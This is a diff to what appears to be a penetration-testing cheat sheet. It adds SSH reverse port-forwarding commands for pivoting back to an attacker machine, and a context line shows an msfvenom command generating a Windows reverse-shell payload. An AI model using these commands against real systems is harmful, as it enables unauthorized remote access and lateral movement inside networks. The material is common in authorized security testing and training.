@@ -571,6 +571,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.205.128 LPORT=4444 EXITFUNC=
 
 ## Pivoting using SSH and Proxychains
 
+### Port Forwarding
 ```
 ssh -L 8000:<webserver_address>:80 user@<ipaddress> -fN
 ```
@@ -578,5 +579,16 @@ ssh -L 8000:<webserver_address>:80 user@<ipaddress> -fN
 Port Forwarding `-L`
 Proxies `-D`
 
+
+### Reverse Port Forward
+
+```
+ssh -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -fN
+```
+
+```
+ssh -R 2222:17.16.0.100:22 kali@17.16.0.200 -i id_rsa -fN
+```
  
+Reverse Forwarding -R
 
